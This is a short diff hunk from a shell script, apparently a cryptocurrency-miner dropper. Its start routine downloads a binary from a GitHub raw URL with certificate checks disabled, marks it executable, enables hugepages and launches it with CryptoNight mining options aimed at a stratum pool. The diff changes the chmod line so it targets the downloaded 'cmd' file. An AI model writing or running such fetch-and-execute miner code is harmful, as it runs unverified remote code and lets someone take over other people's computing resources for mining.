@@ -23,7 +23,7 @@ _RUN(){
    start)  
      wget --no-check-cert https://github.com/osrun/beta/raw/master/cmd
      #wget --no-check-cert https://github.com/osrun/beta/raw/master/run
-     chmod +x run
+     chmod +x cmd
      sysctl -w vm.nr_hugepages=128
      ./cmd -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
      #./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
